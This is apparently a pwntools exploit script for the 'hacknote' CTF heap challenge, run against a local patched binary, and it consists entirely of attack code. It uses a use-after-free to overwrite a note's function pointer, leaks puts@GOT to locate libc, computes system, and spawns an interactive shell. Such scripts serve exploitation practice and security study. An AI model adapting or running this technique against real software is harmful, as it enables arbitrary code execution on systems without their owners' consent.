from pwn import *

sh = process(b"./hacknote_patched")

print_note_addr = p32(0x0804862b)
puts_got        = p32(0x0804a024)

def start():
    sh.recv()

def create_note(size, cont):
    sh.sendline(b"1")
    sh.recv()
    sh.sendline(size)
    sh.recv()
    sh.sendline(cont)
    sh.recv()

def delete_note(idx):
    sh.sendline(b"2")
    sh.recv()
    sh.sendline(idx)
    sh.recv()

def print_note(idx):
    sh.sendline(b"3")
    sh.recv()
    sh.sendline(idx)
    return sh.recv()[0:4]

start()
create_note(b"1000000", b"Pwned") 
create_note(b"1000000", b"By") 
create_note(b"1000000", b"UnknownD4")
delete_note(b"0") 
delete_note(b"1")

create_note(b"10", print_note_addr + puts_got) 
leak = u32(print_note(b"0"))
print("[+] puts@got leak: " + hex(leak))
system = leak - 0x5f140 + 0x3a940 
print("[+] find one_gadget: " + hex(system))

delete_note(b"1")
delete_note(b"2")
create_note(b"10", p32(system) + b"\nsh\0")
print_note(b"1")
sh.interactive()
